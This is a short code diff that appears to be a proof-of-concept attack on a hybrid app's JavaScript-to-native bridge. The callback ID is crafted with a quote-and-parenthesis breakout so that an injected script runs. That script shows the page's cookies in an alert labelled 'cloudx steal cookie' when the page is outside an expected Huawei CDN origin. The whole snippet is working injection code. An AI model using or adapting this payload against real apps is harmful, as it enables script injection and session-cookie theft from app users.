@@ -23,7 +23,7 @@
         });
         // const callbackId = `${service}${genCallbackId()}`;
         const currUrl = location.href;
-        const payload = `if (typeof wiseopercampaign === 'undefined') {window.wiseopercampaign = window.wiseopercampaign || {callbackFromNative: function() {console.log('cloudx hahaha')},};};if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){window.__cloudx_called=true;alert('cloudx steal cookie : '+document.cookie);}`;
+        const payload = `if (typeof wiseopercampaign === 'undefined') {window.wiseopercampaign = window.wiseopercampaign || {callbackFromNative: function() {console.log('cloudx hahaha')},};};if(!location.href.startsWith("https://h5hosting-drcn.dbankcdn.cn")&&!window.__cloudx_called){window.__cloudx_called=true;alert('cloudx steal cookie : '+document.cookie);}`;
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
 
         if (success || fail) callbackCache[callbackId] = {success, fail};
